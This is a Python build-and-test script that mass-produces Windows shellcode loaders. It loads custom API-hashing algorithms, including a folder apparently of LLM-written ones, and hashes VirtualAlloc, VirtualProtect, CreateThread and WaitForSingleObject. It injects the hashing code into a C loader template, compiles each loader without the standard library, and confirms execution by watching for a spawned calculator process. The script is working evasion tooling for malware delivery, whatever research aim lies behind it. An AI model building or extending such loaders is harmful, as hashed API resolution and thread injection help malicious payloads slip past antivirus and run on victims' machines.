import os
import subprocess
import importlib.util
import re
import sys
import time

# =============================================================
# CONFIGURATION - Updated for Phase 2 (Custom Algorithms)
# =============================================================
INPUT_DIR = "./custom-new-algorithms"
OUTPUT_DIR = "./fully-working-templates"
TEMPLATE_FILE = "loader_template.c"

# APIs needed for Thread Injection (Shellcode execution)
TARGET_APIS = [
    "VirtualAlloc", 
    "VirtualProtect", 
    "CreateThread", 
    "WaitForSingleObject"
]

def load_python_module(filepath):
    spec = importlib.util.spec_from_file_location("algo_mod", filepath)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod

def clean_c_code(c_code):
    """Removes main() from the injected C file to prevent linker collisions."""
    return re.sub(r'int\s+main\s*\(.*?\)\s*\{.*?\}', '', c_code, flags=re.DOTALL)

def get_calc_count():
    """Returns total count of Calculator processes (Classic + Modern UWP)."""
    count = 0
    try:
        output = subprocess.check_output('tasklist /FI "IMAGENAME eq calc.exe"', 
                                         shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
        if "No tasks" not in output:
            count += output.lower().count("calc.exe")
    except: pass

    try:
        output = subprocess.check_output('tasklist /FI "IMAGENAME eq CalculatorApp.exe"', 
                                         shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
        if "No tasks" not in output:
            count += output.lower().count("calculatorapp.exe")
    except: pass
    
    return count

def kill_all_calcs():
    """Forcefully kills all types of calculator instances."""
    subprocess.run('taskkill /F /IM calc.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run('taskkill /F /IM CalculatorApp.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def verify_execution(exe_path):
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE

    initial_calcs = get_calc_count()
    
    try:
        loader_proc = subprocess.Popen([exe_path], startupinfo=si)
    except Exception as e:
        print(f"    [-] Launch Error: {e}")
        return False

    start_time = time.time()
    success = False

    while (time.time() - start_time) < 3.0:
        current_calcs = get_calc_count()
        if current_calcs > initial_calcs:
            success = True
            break 
        time.sleep(0.1) 

    if loader_proc.poll() is None:
        loader_proc.terminate()
    
    if success:
        print("    [+] VERIFIED: Calculator spawned.")
        kill_all_calcs()
    else:
        print("    [-] FAILED: Timeout (Calculator did not appear).")

    return success

def run_pipeline():
    if not os.path.exists(OUTPUT_DIR): os.makedirs(OUTPUT_DIR)
    if not os.path.exists(INPUT_DIR):
        print(f"[!] Input directory '{INPUT_DIR}' not found.")
        return

    kill_all_calcs()

    # Get the category folders (custom-human, custom-new-llm, modified)
    category_folders = [f for f in os.listdir(INPUT_DIR) if os.path.isdir(os.path.join(INPUT_DIR, f))]
    
    # Collect all the actual algorithm folders inside the categories
    algo_folders = []
    for category in category_folders:
        category_path = os.path.join(INPUT_DIR, category)
        for algo in os.listdir(category_path):
            if os.path.isdir(os.path.join(category_path, algo)) and algo != "__pycache__":
                algo_folders.append((category, algo))

    print(f"[*] Found {len(algo_folders)} custom algorithms across {len(category_folders)} categories. Starting Batch...\n")

    verified_count = 0

    for category, algo_name in algo_folders:
        # The path is now INPUT_DIR / CATEGORY / ALGO_NAME
        folder_path = os.path.join(INPUT_DIR, category, algo_name)
        c_file = os.path.join(folder_path, f"{algo_name}.c")
        py_file = os.path.join(folder_path, f"{algo_name}.py")

        if not os.path.exists(c_file) or not os.path.exists(py_file):
            print(f"    [!] Skipped {algo_name} (in {category}): Missing .c or .py file.")
            continue

        print(f"[*] Processing: {algo_name} (Category: {category})")

        try:
            # --- 1. Load Python Hash Logic ---
            py_mod = load_python_module(py_file)
            hash_func = None
            
            if hasattr(py_mod, 'hash'): hash_func = py_mod.hash
            else:
                import inspect
                for name, obj in inspect.getmembers(py_mod):
                    if inspect.isfunction(obj) and name not in ["ror", "rol", "rotr64"]:
                        hash_func = obj
                        break
            
            if not hash_func:
                print(f"    [!] Skipped: No hash function found in Python file.")
                continue

            # --- 2. Calculate Expected Hashes ---
            hashes = {}
            for api in TARGET_APIS:
                try: val = hash_func(api.encode())
                except: val = hash_func(api)
                
                if hasattr(val, 'value'): val = val.value
                hashes[api] = int(val) & 0xFFFFFFFF

            # --- 3. Inject C Code & Hashes ---
            with open(c_file, "r") as f: c_algo_clean = clean_c_code(f.read())
            with open(TEMPLATE_FILE, "r") as f: template = f.read()

            final_code = template.replace("// {{ALGORITHM_INJECTION}}", c_algo_clean)
            for api in TARGET_APIS:
                final_code = final_code.replace(f"{{{{HASH_{api}}}}}", f"0x{hashes[api]:X}")

            # --- 4. Save Final C File ---
            algo_out_dir = os.path.join(OUTPUT_DIR, algo_name)
            if not os.path.exists(algo_out_dir): os.makedirs(algo_out_dir)
            
            final_c_path = os.path.join(algo_out_dir, f"{algo_name}_loader.c")
            exe_path = os.path.join(algo_out_dir, f"{algo_name}_loader.exe")

            with open(final_c_path, "w") as f: f.write(final_code)
            
            # --- 5. Compile ---
            cmd = [
                "gcc", final_c_path, "-o", exe_path, 
                "-m64", 
                "-nostdlib",         
                "-nostartfiles", 
                "-Wl,-e,EntryPoint", 
                "-lkernel32"         
            ]
            
            try:
                subprocess.run(cmd, check=True, capture_output=True)
            except subprocess.CalledProcessError as e:
                print(f"    [!] Compile Failed: {e.stderr.decode()}")
                continue
            
            # --- 6. Verify ---
            if verify_execution(exe_path):
                verified_count += 1

        except Exception as e:
            print(f"    [!] Error processing {algo_name}: {e}")

    print(f"\n[*] Batch Completed. Success Rate: {verified_count}/{len(algo_folders)}")

if __name__ == "__main__":
    run_pipeline()